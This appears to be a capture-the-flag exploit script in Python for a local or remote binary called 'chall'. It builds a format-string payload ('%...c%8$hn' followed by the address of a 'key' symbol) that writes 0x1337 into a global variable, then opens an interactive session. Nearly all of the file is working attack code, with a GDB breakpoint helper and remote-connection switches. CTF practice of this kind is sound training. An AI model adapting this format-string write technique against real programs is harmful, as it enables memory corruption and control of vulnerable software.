#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''

b*main+76
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ==================== EXPLOIT ====================

def exploit():

    write = 0x1337
    key = exe.sym["key"]

    payload = f"%{write}c%8$hn".encode()
    payload = payload.ljust(16, b".")
    payload += p64(key)

    sl(payload)

    interactive()

if __name__ == '__main__':
  exploit()
